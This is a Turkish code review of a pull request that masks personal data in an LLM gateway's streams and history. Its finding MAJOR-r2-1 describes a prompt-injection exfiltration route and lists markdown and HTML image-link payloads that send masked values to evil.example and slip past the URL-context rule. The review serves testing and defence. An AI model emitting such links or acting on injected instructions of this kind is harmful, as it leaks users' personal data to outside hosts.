# 08-tam-1a r2 inceleme (delta, r1 DEGISIKLIK kapanışı)

- **SHA:** 6d0d9ba0aa0efcf04eddf9409d36e42f16053f55 (feat/08-tam-1-ner; fb7130d üstüne 9 commit, 26 dosya +1294/-101, `state/` 0)
- **İstek:** K-08T1-0012 · Cevap: R-08T1-0003 (r1), K-08T1-0009 (DUZELT)
- **İnceleyici worktree:** `.worktrees/review-08t1a-r2` (temiz; probe dosyası tek dosya mount ile koşuldu, mount noktası silindi)
- **Yığın:** review08t1a, 18290/13290, `--profile test --profile qdrant` (langfuse + mcp + ticket-desk), `--pull never`, 19 konteyner healthy
- **Karar: DEGISIKLIK** — BLOCKER 0, MAJOR 3, MINOR 7, NOTE 8

r1'in yedi MAJOR'ından beşi kapandı: MAJOR-1, MAJOR-4, MAJOR-5, MAJOR-6 ve MAJOR-7, yığında r1 probe'larıyla doğrulandı. Kapanmayan ikisi şunlar:

- **MAJOR-2 (konuşma geçmişi):** Konsol ve `X-Conversation-Id` yolunda kapandı. Facade agent'ın istemci geçmişi yolunda aynı çakışma yığında yeniden üretildi (MAJOR-r2-2). KARARLAR'ın "yeni kapsamda yeniden tokenize" yarısı da yeniden tokenize yerine yeniden tespite dayanıyor (MAJOR-r2-3).
- **MAJOR-3 (URL sızdırma kanalı):** Listelenen üç bağlam çalışıyor. Ancak aynı saldırı birkaç karakterlik başka bir yazımla geçiyor; yığında uçtan uca gösterildi (MAJOR-r2-1).

## r1 bulgularının kapanışı

| r1 | Durum | Kanıt |
|---|---|---|
| MAJOR-1 TTL sonrası sayaç | **KAPANDI** | Probe, TTL 2 s ile koşuldu. Süre dolunca eski cevap `<<PII_1>>` çözülmüyor (unresolved). Yeni değer `<<PII_2>>` alıyor ve eski cevap yine yeni değere çözülmüyor. Sayaç anahtarı TTL'i 34.560.000 s (400 gün). `lookup` TTL'i yeniliyor: 3×1,4 s aralıkla okundu, değer kaldı. Eski hash'in `n=5` alanından tohumlama yapılıyor: sonraki `<<PII_6>>`. (`08t1a-r2-probe.log`) |
| MAJOR-2 geçmişteki yer tutucu | **KISMİ** | Konsol yolu ve `X-Conversation-Id` yolu: `_history` yer tutucuyu eski kapsamda çözüyor ve yeni kapsamın sayacını taşınan numaranın üstüne ayırıyor (`reserve`, `context_factory` içinde, graf tokenize etmeden önce). Mağaza düzeyi probe: A'nın bayat `<<PII_1>>`'i B'de çözülmüyor, B'nin ilk değeri `<<PII_2>>`. Facade agent istemci geçmişi: açık (MAJOR-r2-2). Yeniden tokenize yerine yeniden tespit: MAJOR-r2-3. |
| MAJOR-3 URL/markdown (karar A) | **KISMİ** | `](https://…)`, `href=`, `scheme://` ve `](//…)` yer tutucuyu tutuyor, `detokenize_skipped_url` yalnız sayı yazıyor. Atlatma yolları MAJOR-r2-1'de. Araç argümanı JSON kaçışı doğru: `{"name": "Ali \"Kaya\" \\ x"}`. |
| MAJOR-4 ReDoS | **KAPANDI** | Ölçümler: token + 20.000 boşluk 0,005 s (r1: 43 s); token + 200.000 boşluk 0,055 s; password + 200.000 boşluk 0,042 s; 180 bin karakter karışık 0,051 s (r1: 59 s). Sekme/satır sonu, " is" tekrarı ve tırnak tekrarı varyantlarının hepsi ≤ 0,02 s. Span eşdeğerliği: 20.000 rastgele örnekte (tohum 20261103, 18 sözcük, 21 ayırıcı) `_SHORT_TOKEN` ve `_ASSIGNMENT` için eski desenle fark 0. |
| MAJOR-5 yanlış pozitif | **KAPANDI** | r1'in beş örneği ve "anahtar teslim projeleri" artık bulgu üretmiyor. `API_KEY=`, `Bearer`, `erişim anahtarı:`, `gizli anahtar` hâlâ yakalanıyor. Yan etkiler NOTE-4'te. |
| MAJOR-6 tümü engellenince `sources` | **KAPANDI** | `retrieve()` (`graph.py:125-131`) ve `_search_tool()` (`:566-578`) önce olayı yazıyor (`selected=[]`, `blocked=[…]`), sonra `StopRun`. `test_08t_12b`/`12c` güncel. F11 e2e boş liste `ValueError`'ı artık oluşmuyor (kod okuması; e2e NOT_RUN, kabul edildi). |
| MAJOR-7 blocked × silinmiş belge | **KAPANDI** | `_SOURCE_LISTS` `"blocked"` içeriyor (`runs.py:180`). blocked girdileri `public()` biçiminde, `document_id` eşleşiyor. `test_08t_m7_blocked_deleted.py` events listesi, canlı akış ve DB replay'i kapsıyor. |
| MINOR-1 hata/iptalde kuyruk | **KAPANDI** (ApiError yolu) | `graph.py` `finally`; `facade_proxy` `except ApiError`. ApiError dışındaki hatalar MINOR-r2-3'te. |
| MINOR-2 rest chunk / finish_reason | **KAPANDI** | Sağlayıcı finish_reason'ı choices içinde verdiğinde `_close` açık anahtarları boşaltıyor; ikinci finish_reason gitmiyor. |
| MINOR-3 JSON kaçışı | **KAPANDI** | Akış testi parçalı yer tutucuyla. Tek parça yolun testi yok (NOTE-6). |
| MINOR-7 S8 uç nokta + rol | **KAPANDI** (dar) | create, resume (başka analist), stream (admin/sahip). Boşluklar NOTE-6'da. |
| MINOR-8 dış/facade agent olumlu test | **KAPANDI** | `test_08t_m8_external_agent_echo_reversed_for_the_caller`, `test_08t_m8_facade_agent_events_reversed` |
| MINOR-11 Redis okuma hatası | **KISMİ** | `follow` üç yerde `RevealUnavailable` yakalıyor ve facade agent 502'ye eşliyor. Ancak yeniden bağlanma sözü tutmuyor (MINOR-r2-2) ve facade düz akış kapsam dışında kaldı (MINOR-r2-3). |
| MINOR-12 docs 16 → 15 | **KAPANDI** | `docs/api.md:477`, `docs/guardrail.md:135`. Kodda bir yorum hâlâ 16 diyor (NOTE-1). |
| FOLLOWUP-162 kısıtları | **VAR** | PR notunda "FOLLOWUP-162'ye ertelenenler": MINOR 4, 5, 6, 9, 10, 13, 14 ve NOTE 1-8. |

## Yeni bulgular

### MAJOR-r2-1 · URL bağlam kuralı birkaç karakterlik yazım farkıyla atlatılıyor (karar A'nın amacı karşılanmıyor) — CONFIRMED (yığın, llmaas)

`_URL_CONTEXT` (`masking.py:266`) bağlamı `](`, `href=` ya da `scheme://` ile başlayıp ilk boşlukta biten bir dizi olarak tanımlıyor. Karar A'nın tehdidi şu: akış yukarısı (sağlayıcı, dış agent, belge ya da araç sonucuyla enjekte edilen talimat) değeri istemcinin otomatik yüklediği bir hedefe koyuyor. Bu tehdit aynı etkiyi şu yazımlarla da elde ediyor:

| Yazım | Sonuç |
|---|---|
| `![x](https://evil.example/p?q=<<PII_1>>)` (kontrol) | tutuldu |
| `![x]( //evil.example/p?q=<<PII_1>>)` (CommonMark `(`'dan sonra boşluğa izin verir; protokolden bağımsız) | **AÇILDI** |
| `![x][1]` + `[1]: //evil.example/p?q=<<PII_1>>` (referans tanımı, protokolden bağımsız) | **AÇILDI** |
| `![x](<https://evil.example/a b?q= <<PII_1>>>)` (açılı hedef, boşluklu) | **AÇILDI** |
| `<img src=//evil.example/?q=<<PII_1>>>`, `<img src="https://evil.example/a b?q= <<PII_1>>">`, `<a href="… <<PII_1>>">` | **AÇILDI** (mağaza düzeyi) |
| Akışta URL başı 8.192 karakterden önce (`StreamDetokenizer` ve konsol `ContextReveal`) | **AÇILDI**. Tek parça yolda tutuldu. PR notunda "bilinen sınır" olarak yazılı, ama sınır fail-open. |

İlk dört satır facade düz yolda (gerçek LiteLLM + fake sağlayıcı, sağlayıcı yer tutucuyu gördü) istemciye ham değerle döndü: `hello ![x]( //evil.example/p?q=ayse.yilmaz@example.test)` (`08t1a-r2-int-probe-llmaas.log`). Mağaza düzeyi tablo `08t1a-r2-probe.log`'da.

**Düzeltme yönü** (karar A'nın kapsamı içinde, yeni karar değil; 8.192 sınırının fail-closed olması koordinatör kararı):
1. Protokolden bağımsız `//host` bir URL sayılmalı.
2. Markdown hedefi `](`'dan eşleşen `)`'a ya da satır sonuna kadar, boşluk ve `<…>` dahil.
3. Referans tanımı satırı `^\s*\[[^\]]+\]:` satır sonuna kadar.
4. HTML öznitelik değerleri: `src`, `href`, `srcset`, `action`, `poster`, `background`; tırnaklıysa kapanış tırnağına kadar.
5. Akışta bağlam kuyruğu kesildiyse (son 8.192 karakterde boşluk yok) yer tutucu tutulmalı.

Daha sağlam bir alternatif: `](`, `]:`, `//`, `src=` ya da `href=` içeren bir satırdaki her yer tutucuyu tutmak. Her iki yol için test: yukarıdaki tablonun hepsi negatif, dört yolda.

### MAJOR-r2-2 · Facade agent istemci geçmişinde bayat yer tutucu yeni kapsamın değerine çözülüyor (r1 MAJOR-2 sınıfı) — CONFIRMED (yığın, llmaas)

`facade_agent.start` istemci geçmişini istek anında `guard.text("egress", text)` ile run kapsamında (`scope=str(run_id)`) denetliyor (`facade_agent.py:200`). Bu denetim kapsama değer yazıyor (`<<PII_1>> = …`). `_history`'deki `reserve` ise ancak sonra, `context_factory`'de koşuyor. Sayaç zaten 1'de olduğu için `reserve(1)` hiçbir şeyi değiştirmiyor.

Probe şu geçmişi gönderdi:
- user: `Benim adresim ayse.yilmaz@example.test`
- assistant: `Kayıt sahibi <<PII_1>>, bağlantı https://crm.example/u?m=<<PII_1>>` — önceki bir cevabın URL kuralıyla tutulmuş yer tutucusu. İstemciler OpenAI deseninde geçmişi her istekte geri yollar.

Sonuç: run kapsamında `<<PII_1>>` → `'ayse.yilmaz@example.test'` (`08t1a-r2-int-probe-llmaas.log`; airgap'te `None`, kontrol). Model geçmişte iki ayrı anlamda tek bir `<<PII_1>>` görüyor ve cevaptaki `<<PII_1>>` arayana yeni değerle açılıyor. Önceki cevapta kastedilen başka bir kişi olabilir. Bu, K-08T1-0009'un "asla başka değere çözülmez" ölçütünün ihlali.

Aynı mekanizmanın iki kod okuması (yığında koşulmadı):
- **Soru metni:** `_history` koşunun kendi satırını atlıyor (`adapters.py:586`). Kullanıcı sorusuna kopyalanmış bir `<<PII_1>>` (örneğin S8 nedeniyle yer tutucu gördüğü başka bir koşudan) ve bir e-posta birlikte varsa çakışıyor.
- **Facade düz yol:** önceki `facade-…` kapsamlarının yer tutucularını geri gönderen istemci.

**Düzeltme yönü:** Kapsamın ilk tokenize işleminden önce, o kapsama giren bütün metnin (istemci geçmişi, soru, `_history`) en büyük yer tutucu numarası `reserve` edilmeli. Facade agent'ta bu `guard.text("egress")` döngüsünden önce yapılmalı. Ayırma 8 haneyle sınırlanmalı (MINOR-r2-1). Test: bu probe senaryosu, konsol sorusu ve facade düz yol.

### MAJOR-r2-3 · Geçmiş ham değere çevriliyor ve yeniden tokenize edilmesi egress'in değeri yeniden bulmasına bağlı (fail-open) — PLAUSIBLE (mekanizma yığında doğrulandı; uçtan uca NOT_RUN)

KARARLAR "Yer tutucu sayacı ve konuşma geçmişi" şunu istiyor: "eski kapsamda çöz + yeni kapsamda yeniden tokenize". Uygulama ise:
- `_history` yer tutucuyu düz `detokenize` ile (URL istisnası olmadan) ham değere çeviriyor (`adapters.py:590`) ve state'e koyuyor.
- Yeni kapsamda tokenize etmek yerine `_egress_messages`'in dedektörlerinin değeri tekrar bulmasına güveniyor.

Dedektörler bağlama bağlı. Bağlam sözcüğü +0,1 puan getiriyor (`recognizers/regex.py:14-15,169`) ve politika `min_confidence` 0-1 arasında ayarlanabiliyor (`schemas.py:65`). Yığında aynı telefon:
- `Telefon: 0532 123 45 67` → 0,85
- `Kendisine 0532 123 45 67 üzerinden ulaşabilirsiniz.` → 0,75

(`08t1a-r2-redetect.log`)

`min_confidence` 0,8 olan bir projede akış şöyle:
1. Koşu A, kaynakta ("Telefon:") numarayı bulup tokenize ediyor.
2. A'nın cevabı "Kendisine `<<PII_1>>` üzerinden…".
3. Koşu B'de `_history` bunu ham sayıya çeviriyor ve egress bulamıyor.
4. Numara llmaas sağlayıcısına ham gidiyor.
5. Model yazarsa cevapta, `run.output`'ta, `messages`'ta ve `run_events`'te ham kalıyor. Bunlar S8'in "yer tutucu görür" dediği saklanan görünümler.

fb7130d'de yer tutucu yer tutucu olarak kalıyordu; bu bir gerileme. Varsayılan `min_confidence` 0,5'te 1a'nın düzenli ifade dedektörleri yeniden buluyor; 1b'nin NER'i bağlama daha bağımlı olacak.

**Düzeltme yönü:** `_history` ham metin üretmemeli. Eski yer tutucuyu eski kapsamda değere, oradan yeni kapsamda `token_for(identity, value)` ile yeni yer tutucuya eşlemeli; kimlik/kategori için ters eşlemede `i:<token>` alanı tutulabilir. Değeri bulunamayan yer tutucu olduğu gibi kalır. Böylece state'e hiç ham değer girmez, URL istisnası da korunur. Test: `min_confidence` 0,8 ile bağlamsız cümlede telefon; sağlayıcıya yer tutucu gittiği ve state'te ham değer olmadığı gösterilmeli.

### MINOR-r2-1 · Geçmişe yazılmış büyük yer tutucu numarası sayacı bozuyor — CONFIRMED (mağaza düzeyi)

`placeholder_numbers` sınırsız `\d+` okuyor ve `reserve` bunu olduğu gibi ayırıyor. Geçmişte `<<PII_99999999>>` varsa (kullanıcının yazdığı bir metin ya da bir belgeden enjekte edilip modelin yankıladığı bir cevap) sonraki değer `<<PII_100000000>>` oluyor. Bu 9 haneli yer tutucu akışta hizalanmıyor ve sahibine ham yer tutucu olarak gidiyor: `Sonuç <<PII_100000000>> tamam`. 2^63'ü aşan bir numara `INCR`'ı `value is not an integer or out of range` hatasıyla düşürüyor (`08t1a-r2-probe.log`). Geçmiş her koşuda yeniden okunduğu için o konuşmanın sonraki her koşusu egress'te hata alır. Düzeltme: yalnız ≤ 8 haneli numaraları sayın, tercihen yalnız eski kapsamın sayacının verdiği aralıktakileri.

### MINOR-r2-2 · `detokenize_unavailable` sonrası yeniden bağlanmada girdi kayboluyor ya da yineleniyor — CONFIRMED (kod)

- **Canlı dal** (`runtime/events.py:221-231`): `last`, `transform`'dan önce başarısız girdinin kimliğine set ediliyor ve hata olayı `id: last` ile gidiyor. İstemcinin `Last-Event-ID`'si hiç almadığı girdi oluyor, `XREAD` onun sonrasından devam ediyor. Bir token parçası sessizce kaybolur; o girdi uç olaysa (`done`/`error`) uç olay hiç gelmez.
- **Replay dalı** (`:198-201`): hata `{after_seq}-0` kimliğiyle gidiyor. Yeniden bağlanma o noktadan başlayarak önceden gönderilmiş satırları yine gönderiyor.

Docs "reconnect to continue" diyor. Testi yalnız ilk satırda düşen replay dalı (`test_08t_r1_minor11_*`). `RedisError` → `RevealUnavailable` dönüşümü, canlı dal ve facade agent eşlemesi testsiz. Düzeltme: hata olayı son teslim edilen girdinin kimliğini taşımalı; canlı dal için test.

### MINOR-r2-3 · Facade düz canlı akışta token deposu hatası akışı olaysız kesiyor — CONFIRMED (kod)

`revealer.choice` (`facade_proxy.py:458`) ya da `revealer.rest()` (`:476`, `:502`) içinden çıkan `RedisError` bir `ApiError` değil. `_relay`'den kaçıyor: istemciye hata olayı ve `[DONE]` gitmiyor, tutulan kuyruk kayboluyor. Bu r1 MINOR-11'in belirtisi, bu kez docs'un saymadığı yolda (docs/guardrail.md yalnız "console or facade agent stream" diyor). Düzeltme: `RevealUnavailable`/`RedisError` `ApiError(502, detokenize_unavailable)`'a çevrilmeli; test.

### MINOR-r2-4 · Geçmiş okuması eski koşuların eşlemelerini süresiz canlı tutuyor — CONFIRMED (kod)

`lookup` her isabette TTL'i yeniliyor (`masking.py:136-141`). `_history` ise her koşu girişiminde (`runner.py:185`; yeniden başlatma ve resume dahil) konuşmadaki bütün eski koşuların yer tutucularını okuyor. Bu yüzden `PII_TOKEN_TTL_S` (1800 s) içinde yeni koşu açılan bir konuşmada önceki tüm koşuların değer eşlemeleri Redis'te sonsuza kadar kalır. KARARLAR yenilemeyi "koşu kendi eşlemesini kullanırken" kabul ediyor; bu onun ötesi. MAJOR-r2-3'ün düzeltmesiyle birlikte çözülebilir; değilse `_history` için yenilemeyen bir okuma.

### MINOR-r2-5 · docs kodla birebir değil — CONFIRMED (kod)

- `docs/agentlar.md:89-90`: "The stored answer, `messages`, `run_events` and the history sent to the model keep the placeholders." Bu artık yanlış. Facade agent istemci geçmişi satırları ham değer taşıyor (`test_08t_m2_client_history_stored_before_egress` bunu iddia ediyor). Geçmiş çözülüp yeni kapsamda yeniden numaralanıyor.
- `docs/agentlar.md:93-94`: sona eren eşleme örneği olarak "onay için uzun bekleyen koşu" geçiyor; artık `lookup` TTL yeniliyor.
- `docs/guardrail.md`: sayaç anahtarı (400 gün, numara tekrar verilmez) ve konuşma geçmişi davranışı yazılı değil.
- `docs/api.md`: facade agent'ta `detokenize_unavailable` → 502 `api_error` eşlemesi yok.
- `_TICKET_ID` büyük harfe duyarlı (2-6 büyük harf + 6 hane); docs "letters then 6+ digits" diyor. `erisim` ASCII varyantı yazılı değil.

### MINOR-r2-6 · PR notu bayat ve kendi içinde çelişkili — CONFIRMED

- Başlık "24 dosya, 6 commit" diyor.
- Kriter 8 "16 karakteri aşan" diyor.
- "106 ölçümü" tablosunda "karışık + rakam 14 %100", r1 tablosunda %99,95. 1/2000 düşüşün nedeni yazılmamış (muhtemelen `_CODE_NAME`/`_TICKET_ID` muafiyeti; doğrulanmadı). "08 r3 probe'ları aynı sayılar" sayı vermiyor.
- K-08T1-0011'in istediği ReDoS süre ölçümü yok, yalnız "< 10 s" test sınırı var. Bu turun ölçümü yukarıdaki tabloda: 200 bin boşluk 0,055 s.
- Varsayım 5 (onayda TTL uzatma FOLLOWUP adayı) artık bayat. Varsayım 6 ("kuyruk yazılmaz") MINOR-1 düzeltmesiyle çelişiyor.
- Güvenlik notunda URL kuralı yok.

### MINOR-r2-7 · Testlerin kapsamadığı yollar

- MINOR-11 yalnız ilk satırda düşen replay ile test ediliyor (bkz. MINOR-r2-2).
- MAJOR-3 testleri listelenen yazımları sınıyor, atlatma sınıfını sınamıyor (MAJOR-r2-1).
- MAJOR-2'nin iki testi `_history`'yi doğrudan çağırıyor. Sağlayıcıya giden mesajda ham değer olmadığını gösteren test yok (MAJOR-r2-3).

## NOTE

1. `masking.py:20` yorumu "a stream holds at most 16 characters" diyor. Tutulan en çok 15 karakter; 16 en uzun yer tutucunun uzunluğu.
2. `graph.py:327-331`: `finally` içindeki `events.live` Redis hatasıyla düşerse özgün sağlayıcı hatasının (`ModelUnavailable` vb.) yerini alır; koşu yanlış kodla biter. Yalnız Redis arızasında.
3. Facade düz yolda hata dalındaki rest chunk `finish_reason="stop"` taşıyor ve hemen ardından hata olayı geliyor. OpenAI istemcisi önce normal bitiş görür.
4. MAJOR-5 yan etkileri (bilinçli takas, kayıt için):
   - `token: ABCDEF1234567` (`_TICKET_ID`) ve `token: AbcDefGhiJklMno` (`_CODE_NAME`) muaf.
   - Tek başına `anahtar:` / `anahtarı:` artık yakalanmıyor (K-08T1-0009 kararı).
   - r1'in `auth_token:` ve `DB_TOKEN=` kaçırmaları sürüyor; FOLLOWUP-162 listesinde mi, doğrulanmadı.
5. URL bağlamı ilk boşluğa kadar sürdüğü için `[a](https://x)<<PII_1>>` ya da sıkışık JSON `{"url":"https://a","to":"<<PII_1>>"}` içinde URL'den sonraki yer tutucu da açılmıyor. Güvenli yön; kullanıcı değeri kaybeder.
6. S8 testi canlı yol ve analist/admin ile sınırlı. Kapsanmayanlar:
   - sahip olmayanın replay'i;
   - superadmin, servis token'ı ve impersonate anahtarı;
   - sahibin kendi koşusunu onaylaması;
   - saklanan görünümlerde "sahip de yer tutucu görür" iddiası.

   MINOR-3'ün tek parça yolunun da testi yok. FOLLOWUP-162 adayı.
7. `detokenize_unavailable` mesajı `runtime/events.py:162`'de İngilizce sabit metin. Mevcut SSE hata mesajı desenini izliyor (`checkpoints.py:34`); yeni bir ihlal değil.
8. `_search_tool` tümü engellenince, önceki iterasyonlarda kullanılabilir kaynak olsa bile koşuyu düşürüyor. r1 NOTE-5, FOLLOWUP-162; değişmedi.

## Güvenlik turu

- **Veri çıkışı (llmaas):**
  - MAJOR-r2-1: istemci tarafında sıfır tıkla dış ana makineye değer.
  - MAJOR-r2-3: yapılandırmaya bağlı olarak sağlayıcıya ham değer.
  - Facade düz yol, sağlayıcıya giden mesajda yer tutucu gösteriyor (probe kontrol satırı).
- **Kişi verisinin karışması:** MAJOR-r2-2, başka bir kişinin yer tutucusu yeni değere çözülüyor (S9).
- **S8:** Sahip dışındaki okuyucu için açma yok; `exit_mode` yalnız start, stream ve resume'da çağrılıyor (kod). Konuşma sahipliği konsol ve facade yolunda aynı kullanıcıya bağlı, yani başka bir kullanıcının geçmişi yeni koşuya taşınmıyor (`api/runs.py:487-497`, `facade_agent.py:135-147`; kod okuması).
- **Saklanan ham veri:** Facade agent istemci geçmişi artık ham saklanıyor. Kullanıcı sorusu zaten ham saklanıyordu; PR notunda yazılı. Bu satırları kimin okuyabildiği doğrulanmadı. MAJOR-r2-3 düzeltilmezse geçmişten çözülen değerler checkpoint'e (onay bekleyen koşu) ve `guardrail_events` önizlemesine de ham girer.
- **Erişilebilirlik:** MINOR-r2-1 (konuşma kalıcı olarak düşer), MINOR-r2-4 (eşleme ömrü).
- **ReDoS:** Kapandı (yukarıdaki ölçüm).
- **06b-2 SSRF probe ve 147:** bu SHA'da iki profilde 138/138; gerileme yok.

## Koşular

| Koşu | Sonuç | Kanıt |
|---|---|---|
| `make test` llmaas | 1046 passed (2:52) | `state/evidence/08t1a-r2-unit-llmaas.log` |
| `make test` airgap | 1046 passed (3:52) | `08t1a-r2-unit-airgap.log` |
| `make test-int` llmaas (tam yığın) | 824 passed, 5 skipped (12:20), kırmızı yok; yeni testler (`test_08t_m1/m2/m3/m7*`) dahil | `08t1a-r2-int-llmaas.log` |
| `make test-int` airgap (tam yığın) | 822 passed, 7 skipped (39:48), kırmızı yok | `08t1a-r2-int-airgap.log` |
| r2 probe (ReDoS, eşdeğerlik, FP/FN, TTL, kapsam, URL, JSON) | yukarıda | `08t1a-r2-probe.log`, `state/reviews/08-tam-1a-r2-probe.py` |
| Entegrasyon probe'u (facade geçmiş, URL yazımları) llmaas / airgap | 5 kırmızı (bulgu) / airgap kontrol | `08t1a-r2-int-probe-{llmaas,airgap}.log`, `state/reviews/08-tam-1a-r2-int-probe.py` |
| Yeniden tespit puanı | yukarıda | `08t1a-r2-redetect.log` |
| 06b-2 SSRF probe + 06b-2/147 testleri | 138/138 llmaas, 138/138 airgap | `08t1a-r2-06b2-probe-{llmaas,airgap}.log` |
| lint | NOT_RUN: işçi kanıtı "lint 0"; delta Python + md, koşu bu turda tekrar edilmedi | — |
| e2e F11 | NOT_RUN: kabul edildi (K-08T1-0009); kod okumasıyla `ValueError` kalktı | — |

## İşçiye kısa liste (DUZELT önerisi)

1. MAJOR-r2-1: URL bağlamı fail-closed. 8.192 sınırını fail-closed yapmak koşuldan koordinatör kararı.
2. MAJOR-r2-2 + MINOR-r2-1: kapsama giren bütün metnin numarasını ilk tokenize işleminden önce ayır, en çok 8 hane.
3. MAJOR-r2-3 + MINOR-r2-4: `_history` eski yer tutucuyu doğrudan yeni yer tutucuya eşlesin, ham metin üretmesin, eski kapsamın TTL'ini yenilemesin.
4. MINOR-r2-2/3: hata olayının kimliği ve facade düz yol.
5. MINOR-r2-5/6: docs ve PR notu.
